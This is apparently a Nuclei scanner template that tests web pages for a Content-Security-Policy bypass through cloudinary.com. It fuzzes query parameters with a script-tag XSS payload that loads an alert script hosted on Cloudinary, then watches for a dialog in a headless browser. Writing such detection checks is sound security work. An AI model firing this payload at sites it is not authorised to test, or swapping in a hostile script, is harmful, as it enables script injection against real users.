flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - cloudinary_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src=https://res.cloudinary.com/dw1fa6csl/raw/upload/v1664828137/samples/test/alert-one_ryg8ba.js></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: cloudinary_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - cloudinary.com
  method: GET
  path:
  - '{{BaseURL}}'
id: cloudinary-csp-bypass
info:
  author: pussycat0x
  metadata:
    verified: false
  name: Content-Security-Policy Bypass - cloudinary
  severity: medium
  tags: xss,csp-bypass,cloudinary,vuln
